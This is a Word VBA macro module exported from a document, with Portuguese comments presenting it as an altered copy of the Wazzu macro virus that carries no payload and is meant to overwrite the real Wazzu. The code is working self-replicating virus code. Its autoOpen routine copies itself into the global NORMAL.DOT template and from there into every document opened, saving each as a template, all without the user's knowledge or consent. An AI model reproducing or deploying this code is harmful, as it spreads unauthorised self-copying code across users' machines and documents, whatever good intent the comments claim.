   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim fileMacro$
   Dim globMacro$
   Dim MacroFile$
       On Error GoTo -1: On Error GoTo errCaught

   '====================================================================
   ' Esta é a parte replicadora do vírus Wazzu
   ' Ela se sobrescreverá sobre o vírus real
   ' Não há nenhuma BOMBA
   ' O objetivo desse Wazzu alterado é destruir o Wazzu verdadeiro
   '                                       Gato Xadrez
   '====================================================================

       WordBasic.FileSummaryInfo Update:=1
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
       WordBasic.CurValues.FileSummaryInfo dlg

       fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
       globMacro$ = "Global:autoOpen"
       MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

       If MacroFile$ = "NORMAL.DOT" Then
           WordBasic.MacroCopy globMacro$, fileMacro$, 0
           WordBasic.FileSaveAs Format:=1
       Else
           WordBasic.MacroCopy fileMacro$, globMacro$, 0
       End If

   GoTo bye

   errCaught:

   bye:
       On Error GoTo -1: On Error GoTo 0

   End Sub
